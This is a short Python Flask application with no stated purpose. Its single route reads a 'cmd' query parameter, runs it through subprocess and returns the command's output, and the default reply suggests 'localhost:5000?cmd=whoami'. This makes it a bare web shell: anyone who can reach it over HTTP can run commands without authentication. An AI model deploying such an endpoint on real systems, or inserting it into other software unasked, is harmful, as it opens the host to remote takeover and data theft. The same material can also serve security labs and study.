import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route("/", methods=["GET"])
def execute():
    cmd = request.args.get('cmd')
    if cmd:
        execution = subprocess.run(cmd.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return str(execution.stdout) + str(execution.stderr)
    return "localhost:5000?cmd=whoami"
if __name__ == "__main__":
    app.run()
